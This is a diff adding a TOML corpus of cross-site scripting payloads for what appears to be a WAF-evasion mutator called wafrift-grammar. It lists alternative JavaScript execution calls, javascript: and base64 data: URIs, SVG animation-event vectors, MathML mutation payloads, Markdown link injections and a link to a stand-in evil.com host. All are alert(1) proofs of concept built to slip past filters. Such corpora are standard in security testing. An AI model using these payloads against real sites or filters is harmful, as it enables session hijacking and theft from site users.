@@ -1,0 +1,102 @@
+# XSS payload corpus for the wafrift-grammar mutator.
+#
+# Each list is a starting set the engine cycles through when expanding
+# an XSS seed payload into variants. Append to the relevant array to
+# teach the mutator a new shape — the engine handles list size growth
+# without code changes.
+
+# ── Alternative ways to execute JavaScript ──
+[[exec_function]]
+template = "alert(1)"
+[[exec_function]]
+template = "alert`1`"           # Tagged template literal
+[[exec_function]]
+template = "confirm(1)"
+[[exec_function]]
+template = "confirm`1`"
+[[exec_function]]
+template = "prompt(1)"
+[[exec_function]]
+template = "print()"
+[[exec_function]]
+template = "eval('alert(1)')"
+[[exec_function]]
+template = "setTimeout('alert(1)')"
+[[exec_function]]
+template = "setInterval('alert(1)',0)"
+[[exec_function]]
+template = "queueMicrotask(()=>alert(1))"
+[[exec_function]]
+template = "Function('alert(1)')()"
+[[exec_function]]
+template = "constructor.constructor('alert(1)')()"
+[[exec_function]]
+template = "[].constructor.constructor('alert(1)')()"
+[[exec_function]]
+template = "window['alert'](1)"
+[[exec_function]]
+template = "self['alert'](1)"
+[[exec_function]]
+template = "top['alert'](1)"
+[[exec_function]]
+template = "this['alert'](1)"
+[[exec_function]]
+template = "location='javascript:alert(1)'"
+[[exec_function]]
+template = "location.href='javascript:alert(1)'"
+[[exec_function]]
+template = "open('javascript:alert(1)')"
+[[exec_function]]
+template = "globalThis['alert'](1)"
+
+# ── URI-scheme execution payloads ──
+[[uri_scheme]]
+payload = "javascript:alert(1)"
+[[uri_scheme]]
+payload = "javascript:alert`1`"
+[[uri_scheme]]
+payload = "javascript:void(alert(1))"
+[[uri_scheme]]
+payload = "data:text/html,<script>alert(1)</script>"
+[[uri_scheme]]
+payload = "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
+[[uri_scheme]]
+payload = "javascript:/*--></title></style></textarea></script><svg onload=alert(1)>"
+
+# ── SVG-based XSS using animation events ──
+[[svg]]
+payload = "<svg><animate onbegin=alert(1) attributeName=x dur=1s>"
+[[svg]]
+payload = "<svg><set onbegin=alert(1) attributename=x to=1>"
+[[svg]]
+payload = "<svg><script>alert(1)</script></svg>"
+[[svg]]
+payload = "<svg><image href=1 onerror=alert(1)>"
+[[svg]]
+payload = "<svg><a><rect width=100 height=100></a><animate attributeName=href values=javascript:alert(1)>"
+
+# ── MathML payloads ──
+[[mathml]]
+payload = "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>"
+[[mathml]]
+payload = "<math><mtext><script>alert(1)</script></mtext></math>"
+[[mathml]]
+payload = "<math href=javascript:alert(1)>CLICKME</math>"
+[[mathml]]
+payload = "<math><maction onclick=alert(1)>X</maction></math>"
+
+# ── Markdown link/image payloads ──
+[[markdown]]
+payload = "[x](javascript:alert(1))"
+[[markdown]]
+payload = "![x](javascript:alert(1))"
+[[markdown]]
+payload = "[x](javascript:alert(1) 'title')"
+[[markdown]]
+payload = "[x](data:text/html,<script>alert(1)</script>)"
+[[markdown]]
+payload = "<img src=x onerror=alert(1)>"
+[[markdown]]
+payload = "<script>alert(1)</script>"
+[[markdown]]
+payload = "[link](//evil.com)"
